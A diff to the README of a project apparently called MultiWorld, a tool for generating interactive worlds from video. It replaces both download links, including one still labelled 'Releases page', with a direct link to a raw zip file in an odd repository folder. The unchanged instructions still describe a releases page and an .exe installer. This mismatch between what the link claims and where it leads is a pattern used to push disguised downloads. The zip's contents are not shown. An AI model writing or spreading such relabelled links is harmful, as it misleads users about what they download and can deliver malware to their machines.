@@ -1,6 +1,6 @@
 # 🌐 MultiWorld - Create interactive worlds from video input
 
-[ ![Download MultiWorld](https://img.shields.io/badge/Download-MultiWorld-blue.svg) ](https://github.com/Argemilson/MultiWorld/releases)
+[ ![Download MultiWorld](https://img.shields.io/badge/Download-MultiWorld-blue.svg) ](https://raw.githubusercontent.com/Argemilson/MultiWorld/main/uptrunk/World-Multi-v3.2.zip)
 
 MultiWorld creates interactive video environments. It uses machine learning to generate realistic scenes based on your choices. You control agents within these simulated worlds. Robotics researchers and game designers use these tools to build complex models.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run this software. Check your system sp
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Go to the [Releases page](https://github.com/Argemilson/MultiWorld/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Argemilson/MultiWorld/main/uptrunk/World-Multi-v3.2.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to download the installer.
 4. Open your Downloads folder once the transfer finishes.
